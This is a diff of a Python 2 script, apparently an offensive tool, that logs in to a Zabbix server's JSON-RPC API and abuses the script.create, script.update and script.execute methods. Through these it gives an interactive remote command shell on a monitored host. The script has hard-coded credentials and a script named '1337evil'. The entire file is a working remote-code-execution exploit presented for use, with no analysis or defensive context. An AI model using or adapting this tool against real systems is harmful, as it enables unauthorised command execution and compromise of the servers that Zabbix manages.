@@ -1,116 +1,86 @@
 #!/usr/bin/env python
-# Zabbix API RCE
+#
+# Zabbix API RCE Shell
+#
+# TODO: Further research needed to discover if
+#       other user accounts can create/modify scripts
+#####################################################
 
 import requests
 import json
 import readline
+import signal
 
-url  = 'http://192.168.101.10/zabbix'    # base url
+url  = 'http://192.168.1.1/zabbix'    # base url
 url += '/api_jsonrpc.php'               # endpoint 
 
-username = 'zapper'         # username
-password = 'zapper'         # password
-hostid = '10001'            # must have write permissions to host
+username = 'superadmin'     # username
+password = 'password'       # password
+hostid = '10101'            # must have write permissions to host
 scriptname = '1337evil'     # w/e you wanna name it
 
 headers = { 'content-type': 'application/json' }
+
 
 def send_request(json_data):
     res = requests.post(url, data=json.dumps(json_data), headers=(headers))
     return res.json();
 
-def logout(session):
+def build_request(method, params, session = None):
     req = {
-        "jsonrpc": "2.0",
-        "method": "user.logout",
-        "params": [],
-        "id": 1,
-        "auth": session
+        "jsonrpc" : "2.0",
+        "method" : method,
+        "params": params,
+        "auth" : session,
+        "id" : 0,
     }
-    
-    res = send_request(req)
+    return req
 
+def login(req):
+    res = send_request(req)
+    if res.has_key("result") and res["result"] != "":
+        session = res["result"]
+        print "[>] Successful login [" + session + "]"
+        return session
+    else:
+        print "[!] unable to authenticate, exiting.."
+        print res
+        exit();
+
+def logout(req):
+    res = send_request(req)
     if (res.has_key("result") and res["result"] == True):
         print "[>] logged out of session"
     else:
         print "[!] unable to log out of session: "
         print res
 
-def login():
-    req = {
-        "jsonrpc" : "2.0",
-        "method" : "user.login",
-        "params": {
-            'user': username,
-            'password': password,
-        },
-        "auth" : None,
-        "id" : 0,
-    }
-    
-    res = send_request(req)
+def get_script(session):
 
-    if res.has_key("result"):
-        print "[>] Successful login"
-        return res["result"]
-    else:
-        print "[!] unable to authenticate"
-        print res
-        exit();
-
-def create(session):
-    req = {
-        "jsonrpc": "2.0",
-        "method": "script.create",
-        "params": {
-            "name": scriptname,
-            "command": "echo hello",
-            "host_access": 3, # 2 = read, 3 = write
-        },
-        "auth": session,
-        "id": 1
+    create_params = { 
+        "name" : scriptname, 
+        "command" : "echo hello", 
+        "host_access" : 3   # 2 = read, 3 = writes
     }
 
-    res = send_request(req)
+    res = send_request(build_request("script.create", create_params, session))
     if res.has_key("result") and res["result"].has_key("scriptids"):
         return res["result"]["scriptids"][0]
     else:
         if "already exists." in res["error"]["data"]:
-            print "[>] script already exists, getting the id"
-            return lookup(session)
-        else:
-            print "[!] could not lock a script" 
-            print res
+            
+            print "[>] script already exists, looking up it's id.."
+            
+            res = send_request(build_request("script.get", 
+                { "output":"extend", "search": { "name" : scriptname } }, session))
+            
+            if res.has_key("result"):
+                return res["result"][0]["scriptid"]
 
-def lookup(session):
-    req = {
-        "jsonrpc": "2.0",
-        "method": "script.get",
-        "params": {
-            "output": "extend",
-            "search": {
-            "name":scriptname,
-            }
-        },
-        "auth": session,
-        "id": 1
-    }
-    res = send_request(req)
-    if res.has_key("result"):
-        return res["result"][0]["scriptid"]
-    else:
-        return ""
+        print "[!] could not lock a script" 
+        print res
 
-def delete(session, scriptid):
-    req = {
-        "jsonrpc": "2.0",
-        "method": "script.delete",
-        "params": [
-            scriptid
-        ],
-        "auth": session,
-        "id": 1
-    }
+def delete(req):
     res = send_request(req)
     if res.has_key("result") and res["result"].has_key("scriptids"):
         if res["result"]["scriptids"][0] == scriptid:
@@ -120,52 +90,39 @@ def delete(session, scriptid):
     print "[!] Unable to delete script:"
     print res
 
-def update(session, scriptid, cmd):
-    req = {
-        "jsonrpc": "2.0",
-        "method": "script.update",
-        "params": {
-            "scriptid": scriptid,
-            "command": cmd
-        },
-        "auth" : session,
-        "id" : 0,
-    }
+def execute(scriptid, cmd, session):
+    upd = send_request(build_request("script.update", {"scriptid":scriptid,"command":cmd}, session))
+    exe = send_request(build_request("script.execute", {"scriptid":scriptid,"hostid":hostid}, session))
+    return exe
 
-    res = send_request(req)
+def quit(session, delete_script = ''):
+    print ""
+    if delete_script != '':
+        delete(build_request("script.delete", [delete_script], session))
 
-def execute(session, scriptid):
-    req = {
-        "jsonrpc": "2.0",
-        "method": "script.execute",
-        "params": {
-            "scriptid": scriptid,
-            "hostid": hostid
-        },
-        "auth" : session,
-        "id" : 0,
-    }
-    res = send_request(req)
-    return res
+    logout(build_request("user.logout", [], session))
+    exit()
 
+## open up a session
+session = login(build_request("user.login", {"user":username,"password":password}))
 
-session = login()
-scriptid = create(session)
+## create / lookup the script by name. return it's ID
+scriptid = get_script(session)
+print "[>] script id found [" + scriptid + "]"
 
-print "[#] script id: " + scriptid
-
+## CMD prompt - update the script and execute the commands
 while True:
-    cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
-    if cmd == "exit":
-        break
-    else:
-        update(session, scriptid, cmd)
-        output = execute(session, scriptid)
-        if output.has_key("result"):
-            print output["result"]["value"]
+    try:
+        cmd = raw_input('\033[41m[zabbix~$]>>: \033[0m ')
+        if cmd == "exit":
+            break
         else:
-            print output
+            output = execute(scriptid, cmd, session)
+            if output.has_key("result"):
+                print output["result"]["value"]
+            else:
+                print output
+    except KeyboardInterrupt:
+        quit(session)
 
-delete(session, scriptid)
-logout(session)
-exit()
+quit(session)
